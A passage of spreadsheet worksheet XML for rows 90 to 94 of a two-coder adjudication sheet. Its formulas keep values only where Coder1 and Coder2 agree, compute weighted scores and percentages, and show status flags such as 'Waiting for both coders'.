        <f>IF(AND(Coder1!K90&amp;""&lt;&gt;"",Coder1!K90&amp;""=Coder2!K90&amp;""),Coder1!K90,"")</f>
        <v/>
      </c>
      <c r="L90" s="14">
        <f>IF(AND(Coder1!L90&amp;""&lt;&gt;"",Coder1!L90&amp;""=Coder2!L90&amp;""),Coder1!L90,"")</f>
        <v/>
      </c>
      <c r="M90" s="14">
        <f>IF(AND(Coder1!M90&amp;""&lt;&gt;"",Coder1!M90&amp;""=Coder2!M90&amp;""),Coder1!M90,"")</f>
        <v/>
      </c>
      <c r="N90" s="14">
        <f>IF(AND(Coder1!N90&amp;""&lt;&gt;"",Coder1!N90&amp;""=Coder2!N90&amp;""),Coder1!N90,"")</f>
        <v/>
      </c>
      <c r="O90" s="14">
        <f>IF(AND(Coder1!O90&amp;""&lt;&gt;"",Coder1!O90&amp;""=Coder2!O90&amp;""),Coder1!O90,"")</f>
        <v/>
      </c>
      <c r="P90" s="14">
        <f>IF(AND(Coder1!P90&amp;""&lt;&gt;"",Coder1!P90&amp;""=Coder2!P90&amp;""),Coder1!P90,"")</f>
        <v/>
      </c>
      <c r="Q90" s="14">
        <f>IF(AND(Coder1!Q90&amp;""&lt;&gt;"",Coder1!Q90&amp;""=Coder2!Q90&amp;""),Coder1!Q90,"")</f>
        <v/>
      </c>
      <c r="R90" s="14">
        <f>IF(AND(Coder1!R90&amp;""&lt;&gt;"",Coder1!R90&amp;""=Coder2!R90&amp;""),Coder1!R90,"")</f>
        <v/>
      </c>
      <c r="S90" s="14">
        <f>IF(AND(Coder1!S90&amp;""&lt;&gt;"",Coder1!S90&amp;""=Coder2!S90&amp;""),Coder1!S90,"")</f>
        <v/>
      </c>
      <c r="T90" s="14">
        <f>IF(AND(Coder1!T90&amp;""&lt;&gt;"",Coder1!T90&amp;""=Coder2!T90&amp;""),Coder1!T90,"")</f>
        <v/>
      </c>
      <c r="U90" s="14">
        <f>IF(AND(Coder1!U90&amp;""&lt;&gt;"",Coder1!U90&amp;""=Coder2!U90&amp;""),Coder1!U90,"")</f>
        <v/>
      </c>
      <c r="V90" s="14">
        <f>IF(AND(Coder1!V90&amp;""&lt;&gt;"",Coder1!V90&amp;""=Coder2!V90&amp;""),Coder1!V90,"")</f>
        <v/>
      </c>
      <c r="W90" s="14">
        <f>IF(AND(Coder1!W90&amp;""&lt;&gt;"",Coder1!W90&amp;""=Coder2!W90&amp;""),Coder1!W90,"")</f>
        <v/>
      </c>
      <c r="X90" s="14">
        <f>IF(AND(Coder1!X90&amp;""&lt;&gt;"",Coder1!X90&amp;""=Coder2!X90&amp;""),Coder1!X90,"")</f>
        <v/>
      </c>
      <c r="Y90" s="14">
        <f>IF(AND(Coder1!Y90&amp;""&lt;&gt;"",Coder1!Y90&amp;""=Coder2!Y90&amp;""),Coder1!Y90,"")</f>
        <v/>
      </c>
      <c r="Z90" s="14">
        <f>IF(AND(Coder1!Z90&amp;""&lt;&gt;"",Coder1!Z90&amp;""=Coder2!Z90&amp;""),Coder1!Z90,"")</f>
        <v/>
      </c>
      <c r="AA90" s="14">
        <f>IF(AND(Coder1!AA90&amp;""&lt;&gt;"",Coder1!AA90&amp;""=Coder2!AA90&amp;""),Coder1!AA90,"")</f>
        <v/>
      </c>
      <c r="AB90" s="14">
        <f>IF(AND(Coder1!AB90&amp;""&lt;&gt;"",Coder1!AB90&amp;""=Coder2!AB90&amp;""),Coder1!AB90,"")</f>
        <v/>
      </c>
      <c r="AC90" s="14">
        <f>IF(AND(Coder1!AC90&amp;""&lt;&gt;"",Coder1!AC90&amp;""=Coder2!AC90&amp;""),Coder1!AC90,"")</f>
        <v/>
      </c>
      <c r="AD90" s="14">
        <f>IF(AND(Coder1!AD90&amp;""&lt;&gt;"",Coder1!AD90&amp;""=Coder2!AD90&amp;""),Coder1!AD90,"")</f>
        <v/>
      </c>
      <c r="AE90" s="14">
        <f>IF(AND(Coder1!AE90&amp;""&lt;&gt;"",Coder1!AE90&amp;""=Coder2!AE90&amp;""),Coder1!AE90,"")</f>
        <v/>
      </c>
      <c r="AF90" s="14">
        <f>IF(AND(Coder1!AF90&amp;""&lt;&gt;"",Coder1!AF90&amp;""=Coder2!AF90&amp;""),Coder1!AF90,"")</f>
        <v/>
      </c>
      <c r="AG90" s="14">
        <f>IF(AND(Coder1!AG90&amp;""&lt;&gt;"",Coder1!AG90&amp;""=Coder2!AG90&amp;""),Coder1!AG90,"")</f>
        <v/>
      </c>
      <c r="AH90" s="14">
        <f>IF(AND(Coder1!AH90&amp;""&lt;&gt;"",Coder1!AH90&amp;""=Coder2!AH90&amp;""),Coder1!AH90,"")</f>
        <v/>
      </c>
      <c r="AI90" s="11">
        <f>IF(COUNT(E90:L90)=0,"",SUM(E90:L90))</f>
        <v/>
      </c>
      <c r="AJ90" s="11">
        <f>IF(AI90="","",N(E90)*3+N(F90)*2+N(G90)*2+N(H90)*2+N(I90)*2+N(J90)*3+N(K90)*3+N(L90)*3)</f>
        <v/>
      </c>
      <c r="AK90" s="11">
        <f>IF(AI90="","",COUNTIF(N90:AG90,1))</f>
        <v/>
      </c>
      <c r="AL90" s="11">
        <f>IF(OR(AJ90="",AJ90=0),"",ROUND(100*(AJ90-AK90)/AJ90,1))</f>
        <v/>
      </c>
      <c r="AM90" s="11">
        <f>IF(AND(Coder1!AN90=1,Coder2!AN90=1),IF(COUNTBLANK(E90:AH90)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN90" s="11">
        <f>IF(AND(Coder1!AN90=1,Coder2!AN90=1),IF(SUMPRODUCT(--(Coder1!E90:AH90&amp;""&lt;&gt;Coder2!E90:AH90&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO90" s="11" t="n"/>
    </row>
    <row r="91">
      <c r="A91" s="11">
        <f>Coder1!A91</f>
        <v/>
      </c>
      <c r="B91" s="11">
        <f>Coder1!B91</f>
        <v/>
      </c>
      <c r="C91" s="11">
        <f>Coder1!C91</f>
        <v/>
      </c>
      <c r="D91" s="11">
        <f>Coder1!D91</f>
        <v/>
      </c>
      <c r="E91" s="14">
        <f>IF(AND(Coder1!E91&amp;""&lt;&gt;"",Coder1!E91&amp;""=Coder2!E91&amp;""),Coder1!E91,"")</f>
        <v/>
      </c>
      <c r="F91" s="14">
        <f>IF(AND(Coder1!F91&amp;""&lt;&gt;"",Coder1!F91&amp;""=Coder2!F91&amp;""),Coder1!F91,"")</f>
        <v/>
      </c>
      <c r="G91" s="14">
        <f>IF(AND(Coder1!G91&amp;""&lt;&gt;"",Coder1!G91&amp;""=Coder2!G91&amp;""),Coder1!G91,"")</f>
        <v/>
      </c>
      <c r="H91" s="14">
        <f>IF(AND(Coder1!H91&amp;""&lt;&gt;"",Coder1!H91&amp;""=Coder2!H91&amp;""),Coder1!H91,"")</f>
        <v/>
      </c>
      <c r="I91" s="14">
        <f>IF(AND(Coder1!I91&amp;""&lt;&gt;"",Coder1!I91&amp;""=Coder2!I91&amp;""),Coder1!I91,"")</f>
        <v/>
      </c>
      <c r="J91" s="14">
        <f>IF(AND(Coder1!J91&amp;""&lt;&gt;"",Coder1!J91&amp;""=Coder2!J91&amp;""),Coder1!J91,"")</f>
        <v/>
      </c>
      <c r="K91" s="14">
        <f>IF(AND(Coder1!K91&amp;""&lt;&gt;"",Coder1!K91&amp;""=Coder2!K91&amp;""),Coder1!K91,"")</f>
        <v/>
      </c>
      <c r="L91" s="14">
        <f>IF(AND(Coder1!L91&amp;""&lt;&gt;"",Coder1!L91&amp;""=Coder2!L91&amp;""),Coder1!L91,"")</f>
        <v/>
      </c>
      <c r="M91" s="14">
        <f>IF(AND(Coder1!M91&amp;""&lt;&gt;"",Coder1!M91&amp;""=Coder2!M91&amp;""),Coder1!M91,"")</f>
        <v/>
      </c>
      <c r="N91" s="14">
        <f>IF(AND(Coder1!N91&amp;""&lt;&gt;"",Coder1!N91&amp;""=Coder2!N91&amp;""),Coder1!N91,"")</f>
        <v/>
      </c>
      <c r="O91" s="14">
        <f>IF(AND(Coder1!O91&amp;""&lt;&gt;"",Coder1!O91&amp;""=Coder2!O91&amp;""),Coder1!O91,"")</f>
        <v/>
      </c>
      <c r="P91" s="14">
        <f>IF(AND(Coder1!P91&amp;""&lt;&gt;"",Coder1!P91&amp;""=Coder2!P91&amp;""),Coder1!P91,"")</f>
        <v/>
      </c>
      <c r="Q91" s="14">
        <f>IF(AND(Coder1!Q91&amp;""&lt;&gt;"",Coder1!Q91&amp;""=Coder2!Q91&amp;""),Coder1!Q91,"")</f>
        <v/>
      </c>
      <c r="R91" s="14">
        <f>IF(AND(Coder1!R91&amp;""&lt;&gt;"",Coder1!R91&amp;""=Coder2!R91&amp;""),Coder1!R91,"")</f>
        <v/>
      </c>
      <c r="S91" s="14">
        <f>IF(AND(Coder1!S91&amp;""&lt;&gt;"",Coder1!S91&amp;""=Coder2!S91&amp;""),Coder1!S91,"")</f>
        <v/>
      </c>
      <c r="T91" s="14">
        <f>IF(AND(Coder1!T91&amp;""&lt;&gt;"",Coder1!T91&amp;""=Coder2!T91&amp;""),Coder1!T91,"")</f>
        <v/>
      </c>
      <c r="U91" s="14">
        <f>IF(AND(Coder1!U91&amp;""&lt;&gt;"",Coder1!U91&amp;""=Coder2!U91&amp;""),Coder1!U91,"")</f>
        <v/>
      </c>
      <c r="V91" s="14">
        <f>IF(AND(Coder1!V91&amp;""&lt;&gt;"",Coder1!V91&amp;""=Coder2!V91&amp;""),Coder1!V91,"")</f>
        <v/>
      </c>
      <c r="W91" s="14">
        <f>IF(AND(Coder1!W91&amp;""&lt;&gt;"",Coder1!W91&amp;""=Coder2!W91&amp;""),Coder1!W91,"")</f>
        <v/>
      </c>
      <c r="X91" s="14">
        <f>IF(AND(Coder1!X91&amp;""&lt;&gt;"",Coder1!X91&amp;""=Coder2!X91&amp;""),Coder1!X91,"")</f>
        <v/>
      </c>
      <c r="Y91" s="14">
        <f>IF(AND(Coder1!Y91&amp;""&lt;&gt;"",Coder1!Y91&amp;""=Coder2!Y91&amp;""),Coder1!Y91,"")</f>
        <v/>
      </c>
      <c r="Z91" s="14">
        <f>IF(AND(Coder1!Z91&amp;""&lt;&gt;"",Coder1!Z91&amp;""=Coder2!Z91&amp;""),Coder1!Z91,"")</f>
        <v/>
      </c>
      <c r="AA91" s="14">
        <f>IF(AND(Coder1!AA91&amp;""&lt;&gt;"",Coder1!AA91&amp;""=Coder2!AA91&amp;""),Coder1!AA91,"")</f>
        <v/>
      </c>
      <c r="AB91" s="14">
        <f>IF(AND(Coder1!AB91&amp;""&lt;&gt;"",Coder1!AB91&amp;""=Coder2!AB91&amp;""),Coder1!AB91,"")</f>
        <v/>
      </c>
      <c r="AC91" s="14">
        <f>IF(AND(Coder1!AC91&amp;""&lt;&gt;"",Coder1!AC91&amp;""=Coder2!AC91&amp;""),Coder1!AC91,"")</f>
        <v/>
      </c>
      <c r="AD91" s="14">
        <f>IF(AND(Coder1!AD91&amp;""&lt;&gt;"",Coder1!AD91&amp;""=Coder2!AD91&amp;""),Coder1!AD91,"")</f>
        <v/>
      </c>
      <c r="AE91" s="14">
        <f>IF(AND(Coder1!AE91&amp;""&lt;&gt;"",Coder1!AE91&amp;""=Coder2!AE91&amp;""),Coder1!AE91,"")</f>
        <v/>
      </c>
      <c r="AF91" s="14">
        <f>IF(AND(Coder1!AF91&amp;""&lt;&gt;"",Coder1!AF91&amp;""=Coder2!AF91&amp;""),Coder1!AF91,"")</f>
        <v/>
      </c>
      <c r="AG91" s="14">
        <f>IF(AND(Coder1!AG91&amp;""&lt;&gt;"",Coder1!AG91&amp;""=Coder2!AG91&amp;""),Coder1!AG91,"")</f>
        <v/>
      </c>
      <c r="AH91" s="14">
        <f>IF(AND(Coder1!AH91&amp;""&lt;&gt;"",Coder1!AH91&amp;""=Coder2!AH91&amp;""),Coder1!AH91,"")</f>
        <v/>
      </c>
      <c r="AI91" s="11">
        <f>IF(COUNT(E91:L91)=0,"",SUM(E91:L91))</f>
        <v/>
      </c>
      <c r="AJ91" s="11">
        <f>IF(AI91="","",N(E91)*3+N(F91)*2+N(G91)*2+N(H91)*2+N(I91)*2+N(J91)*3+N(K91)*3+N(L91)*3)</f>
        <v/>
      </c>
      <c r="AK91" s="11">
        <f>IF(AI91="","",COUNTIF(N91:AG91,1))</f>
        <v/>
      </c>
      <c r="AL91" s="11">
        <f>IF(OR(AJ91="",AJ91=0),"",ROUND(100*(AJ91-AK91)/AJ91,1))</f>
        <v/>
      </c>
      <c r="AM91" s="11">
        <f>IF(AND(Coder1!AN91=1,Coder2!AN91=1),IF(COUNTBLANK(E91:AH91)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN91" s="11">
        <f>IF(AND(Coder1!AN91=1,Coder2!AN91=1),IF(SUMPRODUCT(--(Coder1!E91:AH91&amp;""&lt;&gt;Coder2!E91:AH91&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO91" s="11" t="n"/>
    </row>
    <row r="92">
      <c r="A92" s="11">
        <f>Coder1!A92</f>
        <v/>
      </c>
      <c r="B92" s="11">
        <f>Coder1!B92</f>
        <v/>
      </c>
      <c r="C92" s="11">
        <f>Coder1!C92</f>
        <v/>
      </c>
      <c r="D92" s="11">
        <f>Coder1!D92</f>
        <v/>
      </c>
      <c r="E92" s="14">
        <f>IF(AND(Coder1!E92&amp;""&lt;&gt;"",Coder1!E92&amp;""=Coder2!E92&amp;""),Coder1!E92,"")</f>
        <v/>
      </c>
      <c r="F92" s="14">
        <f>IF(AND(Coder1!F92&amp;""&lt;&gt;"",Coder1!F92&amp;""=Coder2!F92&amp;""),Coder1!F92,"")</f>
        <v/>
      </c>
      <c r="G92" s="14">
        <f>IF(AND(Coder1!G92&amp;""&lt;&gt;"",Coder1!G92&amp;""=Coder2!G92&amp;""),Coder1!G92,"")</f>
        <v/>
      </c>
      <c r="H92" s="14">
        <f>IF(AND(Coder1!H92&amp;""&lt;&gt;"",Coder1!H92&amp;""=Coder2!H92&amp;""),Coder1!H92,"")</f>
        <v/>
      </c>
      <c r="I92" s="14">
        <f>IF(AND(Coder1!I92&amp;""&lt;&gt;"",Coder1!I92&amp;""=Coder2!I92&amp;""),Coder1!I92,"")</f>
        <v/>
      </c>
      <c r="J92" s="14">
        <f>IF(AND(Coder1!J92&amp;""&lt;&gt;"",Coder1!J92&amp;""=Coder2!J92&amp;""),Coder1!J92,"")</f>
        <v/>
      </c>
      <c r="K92" s="14">
        <f>IF(AND(Coder1!K92&amp;""&lt;&gt;"",Coder1!K92&amp;""=Coder2!K92&amp;""),Coder1!K92,"")</f>
        <v/>
      </c>
      <c r="L92" s="14">
        <f>IF(AND(Coder1!L92&amp;""&lt;&gt;"",Coder1!L92&amp;""=Coder2!L92&amp;""),Coder1!L92,"")</f>
        <v/>
      </c>
      <c r="M92" s="14">
        <f>IF(AND(Coder1!M92&amp;""&lt;&gt;"",Coder1!M92&amp;""=Coder2!M92&amp;""),Coder1!M92,"")</f>
        <v/>
      </c>
      <c r="N92" s="14">
        <f>IF(AND(Coder1!N92&amp;""&lt;&gt;"",Coder1!N92&amp;""=Coder2!N92&amp;""),Coder1!N92,"")</f>
        <v/>
      </c>
      <c r="O92" s="14">
        <f>IF(AND(Coder1!O92&amp;""&lt;&gt;"",Coder1!O92&amp;""=Coder2!O92&amp;""),Coder1!O92,"")</f>
        <v/>
      </c>
      <c r="P92" s="14">
        <f>IF(AND(Coder1!P92&amp;""&lt;&gt;"",Coder1!P92&amp;""=Coder2!P92&amp;""),Coder1!P92,"")</f>
        <v/>
      </c>
      <c r="Q92" s="14">
        <f>IF(AND(Coder1!Q92&amp;""&lt;&gt;"",Coder1!Q92&amp;""=Coder2!Q92&amp;""),Coder1!Q92,"")</f>
        <v/>
      </c>
      <c r="R92" s="14">
        <f>IF(AND(Coder1!R92&amp;""&lt;&gt;"",Coder1!R92&amp;""=Coder2!R92&amp;""),Coder1!R92,"")</f>
        <v/>
      </c>
      <c r="S92" s="14">
        <f>IF(AND(Coder1!S92&amp;""&lt;&gt;"",Coder1!S92&amp;""=Coder2!S92&amp;""),Coder1!S92,"")</f>
        <v/>
      </c>
      <c r="T92" s="14">
        <f>IF(AND(Coder1!T92&amp;""&lt;&gt;"",Coder1!T92&amp;""=Coder2!T92&amp;""),Coder1!T92,"")</f>
        <v/>
      </c>
      <c r="U92" s="14">
        <f>IF(AND(Coder1!U92&amp;""&lt;&gt;"",Coder1!U92&amp;""=Coder2!U92&amp;""),Coder1!U92,"")</f>
        <v/>
      </c>
      <c r="V92" s="14">
        <f>IF(AND(Coder1!V92&amp;""&lt;&gt;"",Coder1!V92&amp;""=Coder2!V92&amp;""),Coder1!V92,"")</f>
        <v/>
      </c>
      <c r="W92" s="14">
        <f>IF(AND(Coder1!W92&amp;""&lt;&gt;"",Coder1!W92&amp;""=Coder2!W92&amp;""),Coder1!W92,"")</f>
        <v/>
      </c>
      <c r="X92" s="14">
        <f>IF(AND(Coder1!X92&amp;""&lt;&gt;"",Coder1!X92&amp;""=Coder2!X92&amp;""),Coder1!X92,"")</f>
        <v/>
      </c>
      <c r="Y92" s="14">
        <f>IF(AND(Coder1!Y92&amp;""&lt;&gt;"",Coder1!Y92&amp;""=Coder2!Y92&amp;""),Coder1!Y92,"")</f>
        <v/>
      </c>
      <c r="Z92" s="14">
        <f>IF(AND(Coder1!Z92&amp;""&lt;&gt;"",Coder1!Z92&amp;""=Coder2!Z92&amp;""),Coder1!Z92,"")</f>
        <v/>
      </c>
      <c r="AA92" s="14">
        <f>IF(AND(Coder1!AA92&amp;""&lt;&gt;"",Coder1!AA92&amp;""=Coder2!AA92&amp;""),Coder1!AA92,"")</f>
        <v/>
      </c>
      <c r="AB92" s="14">
        <f>IF(AND(Coder1!AB92&amp;""&lt;&gt;"",Coder1!AB92&amp;""=Coder2!AB92&amp;""),Coder1!AB92,"")</f>
        <v/>
      </c>
      <c r="AC92" s="14">
        <f>IF(AND(Coder1!AC92&amp;""&lt;&gt;"",Coder1!AC92&amp;""=Coder2!AC92&amp;""),Coder1!AC92,"")</f>
        <v/>
      </c>
      <c r="AD92" s="14">
        <f>IF(AND(Coder1!AD92&amp;""&lt;&gt;"",Coder1!AD92&amp;""=Coder2!AD92&amp;""),Coder1!AD92,"")</f>
        <v/>
      </c>
      <c r="AE92" s="14">
        <f>IF(AND(Coder1!AE92&amp;""&lt;&gt;"",Coder1!AE92&amp;""=Coder2!AE92&amp;""),Coder1!AE92,"")</f>
        <v/>
      </c>
      <c r="AF92" s="14">
        <f>IF(AND(Coder1!AF92&amp;""&lt;&gt;"",Coder1!AF92&amp;""=Coder2!AF92&amp;""),Coder1!AF92,"")</f>
        <v/>
      </c>
      <c r="AG92" s="14">
        <f>IF(AND(Coder1!AG92&amp;""&lt;&gt;"",Coder1!AG92&amp;""=Coder2!AG92&amp;""),Coder1!AG92,"")</f>
        <v/>
      </c>
      <c r="AH92" s="14">
        <f>IF(AND(Coder1!AH92&amp;""&lt;&gt;"",Coder1!AH92&amp;""=Coder2!AH92&amp;""),Coder1!AH92,"")</f>
        <v/>
      </c>
      <c r="AI92" s="11">
        <f>IF(COUNT(E92:L92)=0,"",SUM(E92:L92))</f>
        <v/>
      </c>
      <c r="AJ92" s="11">
        <f>IF(AI92="","",N(E92)*3+N(F92)*2+N(G92)*2+N(H92)*2+N(I92)*2+N(J92)*3+N(K92)*3+N(L92)*3)</f>
        <v/>
      </c>
      <c r="AK92" s="11">
        <f>IF(AI92="","",COUNTIF(N92:AG92,1))</f>
        <v/>
      </c>
      <c r="AL92" s="11">
        <f>IF(OR(AJ92="",AJ92=0),"",ROUND(100*(AJ92-AK92)/AJ92,1))</f>
        <v/>
      </c>
      <c r="AM92" s="11">
        <f>IF(AND(Coder1!AN92=1,Coder2!AN92=1),IF(COUNTBLANK(E92:AH92)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN92" s="11">
        <f>IF(AND(Coder1!AN92=1,Coder2!AN92=1),IF(SUMPRODUCT(--(Coder1!E92:AH92&amp;""&lt;&gt;Coder2!E92:AH92&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO92" s="11" t="n"/>
    </row>
    <row r="93">
      <c r="A93" s="11">
        <f>Coder1!A93</f>
        <v/>
      </c>
      <c r="B93" s="11">
        <f>Coder1!B93</f>
        <v/>
      </c>
      <c r="C93" s="11">
        <f>Coder1!C93</f>
        <v/>
      </c>
      <c r="D93" s="11">
        <f>Coder1!D93</f>
        <v/>
      </c>
      <c r="E93" s="14">
        <f>IF(AND(Coder1!E93&amp;""&lt;&gt;"",Coder1!E93&amp;""=Coder2!E93&amp;""),Coder1!E93,"")</f>
        <v/>
      </c>
      <c r="F93" s="14">
        <f>IF(AND(Coder1!F93&amp;""&lt;&gt;"",Coder1!F93&amp;""=Coder2!F93&amp;""),Coder1!F93,"")</f>
        <v/>
      </c>
      <c r="G93" s="14">
        <f>IF(AND(Coder1!G93&amp;""&lt;&gt;"",Coder1!G93&amp;""=Coder2!G93&amp;""),Coder1!G93,"")</f>
        <v/>
      </c>
      <c r="H93" s="14">
        <f>IF(AND(Coder1!H93&amp;""&lt;&gt;"",Coder1!H93&amp;""=Coder2!H93&amp;""),Coder1!H93,"")</f>
        <v/>
      </c>
      <c r="I93" s="14">
        <f>IF(AND(Coder1!I93&amp;""&lt;&gt;"",Coder1!I93&amp;""=Coder2!I93&amp;""),Coder1!I93,"")</f>
        <v/>
      </c>
      <c r="J93" s="14">
        <f>IF(AND(Coder1!J93&amp;""&lt;&gt;"",Coder1!J93&amp;""=Coder2!J93&amp;""),Coder1!J93,"")</f>
        <v/>
      </c>
      <c r="K93" s="14">
        <f>IF(AND(Coder1!K93&amp;""&lt;&gt;"",Coder1!K93&amp;""=Coder2!K93&amp;""),Coder1!K93,"")</f>
        <v/>
      </c>
      <c r="L93" s="14">
        <f>IF(AND(Coder1!L93&amp;""&lt;&gt;"",Coder1!L93&amp;""=Coder2!L93&amp;""),Coder1!L93,"")</f>
        <v/>
      </c>
      <c r="M93" s="14">
        <f>IF(AND(Coder1!M93&amp;""&lt;&gt;"",Coder1!M93&amp;""=Coder2!M93&amp;""),Coder1!M93,"")</f>
        <v/>
      </c>
      <c r="N93" s="14">
        <f>IF(AND(Coder1!N93&amp;""&lt;&gt;"",Coder1!N93&amp;""=Coder2!N93&amp;""),Coder1!N93,"")</f>
        <v/>
      </c>
      <c r="O93" s="14">
        <f>IF(AND(Coder1!O93&amp;""&lt;&gt;"",Coder1!O93&amp;""=Coder2!O93&amp;""),Coder1!O93,"")</f>
        <v/>
      </c>
      <c r="P93" s="14">
        <f>IF(AND(Coder1!P93&amp;""&lt;&gt;"",Coder1!P93&amp;""=Coder2!P93&amp;""),Coder1!P93,"")</f>
        <v/>
      </c>
      <c r="Q93" s="14">
        <f>IF(AND(Coder1!Q93&amp;""&lt;&gt;"",Coder1!Q93&amp;""=Coder2!Q93&amp;""),Coder1!Q93,"")</f>
        <v/>
      </c>
      <c r="R93" s="14">
        <f>IF(AND(Coder1!R93&amp;""&lt;&gt;"",Coder1!R93&amp;""=Coder2!R93&amp;""),Coder1!R93,"")</f>
        <v/>
      </c>
      <c r="S93" s="14">
        <f>IF(AND(Coder1!S93&amp;""&lt;&gt;"",Coder1!S93&amp;""=Coder2!S93&amp;""),Coder1!S93,"")</f>
        <v/>
      </c>
      <c r="T93" s="14">
        <f>IF(AND(Coder1!T93&amp;""&lt;&gt;"",Coder1!T93&amp;""=Coder2!T93&amp;""),Coder1!T93,"")</f>
        <v/>
      </c>
      <c r="U93" s="14">
        <f>IF(AND(Coder1!U93&amp;""&lt;&gt;"",Coder1!U93&amp;""=Coder2!U93&amp;""),Coder1!U93,"")</f>
        <v/>
      </c>
      <c r="V93" s="14">
        <f>IF(AND(Coder1!V93&amp;""&lt;&gt;"",Coder1!V93&amp;""=Coder2!V93&amp;""),Coder1!V93,"")</f>
        <v/>
      </c>
      <c r="W93" s="14">
        <f>IF(AND(Coder1!W93&amp;""&lt;&gt;"",Coder1!W93&amp;""=Coder2!W93&amp;""),Coder1!W93,"")</f>
        <v/>
      </c>
      <c r="X93" s="14">
        <f>IF(AND(Coder1!X93&amp;""&lt;&gt;"",Coder1!X93&amp;""=Coder2!X93&amp;""),Coder1!X93,"")</f>
        <v/>
      </c>
      <c r="Y93" s="14">
        <f>IF(AND(Coder1!Y93&amp;""&lt;&gt;"",Coder1!Y93&amp;""=Coder2!Y93&amp;""),Coder1!Y93,"")</f>
        <v/>
      </c>
      <c r="Z93" s="14">
        <f>IF(AND(Coder1!Z93&amp;""&lt;&gt;"",Coder1!Z93&amp;""=Coder2!Z93&amp;""),Coder1!Z93,"")</f>
        <v/>
      </c>
      <c r="AA93" s="14">
        <f>IF(AND(Coder1!AA93&amp;""&lt;&gt;"",Coder1!AA93&amp;""=Coder2!AA93&amp;""),Coder1!AA93,"")</f>
        <v/>
      </c>
      <c r="AB93" s="14">
        <f>IF(AND(Coder1!AB93&amp;""&lt;&gt;"",Coder1!AB93&amp;""=Coder2!AB93&amp;""),Coder1!AB93,"")</f>
        <v/>
      </c>
      <c r="AC93" s="14">
        <f>IF(AND(Coder1!AC93&amp;""&lt;&gt;"",Coder1!AC93&amp;""=Coder2!AC93&amp;""),Coder1!AC93,"")</f>
        <v/>
      </c>
      <c r="AD93" s="14">
        <f>IF(AND(Coder1!AD93&amp;""&lt;&gt;"",Coder1!AD93&amp;""=Coder2!AD93&amp;""),Coder1!AD93,"")</f>
        <v/>
      </c>
      <c r="AE93" s="14">
        <f>IF(AND(Coder1!AE93&amp;""&lt;&gt;"",Coder1!AE93&amp;""=Coder2!AE93&amp;""),Coder1!AE93,"")</f>
        <v/>
      </c>
      <c r="AF93" s="14">
        <f>IF(AND(Coder1!AF93&amp;""&lt;&gt;"",Coder1!AF93&amp;""=Coder2!AF93&amp;""),Coder1!AF93,"")</f>
        <v/>
      </c>
      <c r="AG93" s="14">
        <f>IF(AND(Coder1!AG93&amp;""&lt;&gt;"",Coder1!AG93&amp;""=Coder2!AG93&amp;""),Coder1!AG93,"")</f>
        <v/>
      </c>
      <c r="AH93" s="14">
        <f>IF(AND(Coder1!AH93&amp;""&lt;&gt;"",Coder1!AH93&amp;""=Coder2!AH93&amp;""),Coder1!AH93,"")</f>
        <v/>
      </c>
      <c r="AI93" s="11">
        <f>IF(COUNT(E93:L93)=0,"",SUM(E93:L93))</f>
        <v/>
      </c>
      <c r="AJ93" s="11">
        <f>IF(AI93="","",N(E93)*3+N(F93)*2+N(G93)*2+N(H93)*2+N(I93)*2+N(J93)*3+N(K93)*3+N(L93)*3)</f>
        <v/>
      </c>
      <c r="AK93" s="11">
        <f>IF(AI93="","",COUNTIF(N93:AG93,1))</f>
        <v/>
      </c>
      <c r="AL93" s="11">
        <f>IF(OR(AJ93="",AJ93=0),"",ROUND(100*(AJ93-AK93)/AJ93,1))</f>
        <v/>
      </c>
      <c r="AM93" s="11">
        <f>IF(AND(Coder1!AN93=1,Coder2!AN93=1),IF(COUNTBLANK(E93:AH93)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN93" s="11">
        <f>IF(AND(Coder1!AN93=1,Coder2!AN93=1),IF(SUMPRODUCT(--(Coder1!E93:AH93&amp;""&lt;&gt;Coder2!E93:AH93&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO93" s="11" t="n"/>
    </row>
    <row r="94">
      <c r="A94" s="11">
        <f>Coder1!A94</f>
        <v/>
      </c>
      <c r="B94" s="11">
        <f>Coder1!B94</f>
        <v/>
      </c>
      <c r="C94" s="11">
        <f>Coder1!C94</f>
        <v/>
      </c>
      <c r="D94" s="11">
        <f>Coder1!D94</f>
        <v/>
      </c>
      <c r="E94" s="14">
        <f>IF(AND(Coder1!E94&amp;""&lt;&gt;"",Coder1!E94&amp;""=Coder2!E94&amp;""),Coder1!E94,"")</f>
        <v/>
      </c>
      <c r="F94" s="14">
        <f>IF(AND(Coder1!F94&amp;""&lt;&gt;"",Coder1!F94&amp;""=Coder2!F94&amp;""),Coder1!F94,"")</f>
        <v/>
      </c>
      <c r="G94" s="14">
        <f>IF(AND(Coder1!G94&amp;""&lt;&gt;"",Coder1!G94&amp;""=Coder2!G94&amp;""),Coder1!G94,"")</f>
        <v/>
      </c>
      <c r="H94" s="14">
        <f>IF(AND(Coder1!H94&amp;""&lt;&gt;"",Coder1!H94&amp;""=Coder2!H94&amp;""),Coder1!H94,"")</f>
        <v/>
      </c>
      <c r="I94" s="14">
        <f>IF(AND(Coder1!I94&amp;""&lt;&gt;"",Coder1!I94&amp;""=Coder2!I94&amp;""),Coder1!I94,"")</f>
        <v/>
      </c>
      <c r="J94" s="14">
        <f>IF(AND(Coder1!J94&amp;""&lt;&gt;"",Coder1!J94&amp;""=Coder2!J94&amp;""),Coder1!J94,"")</f>
        <v/>
      </c>
      <c r="K94" s="14">
        <f>IF(AND(Coder1!K94&amp;""&lt;&gt;"",Coder1!K94&amp;""=Coder2!K94&amp;""),Coder1!K94,"")</f>
        <v/>
      </c>
      <c r="L94" s="14">
        <f>IF(AND(Coder1!L94&amp;""&lt;&gt;"",Coder1!L94&amp;""=Coder2!L94&amp;""),Coder1!L94,"")</f>
        <v/>
      </c>
      <c r="M94" s="14">
        <f>IF(AND(Coder1!M94&amp;""&lt;&gt;"",Coder1!M94&amp;""=Coder2!M94&amp;""),Coder1!M94,"")</f>
        <v/>
      </c>
      <c r="N94" s="14">
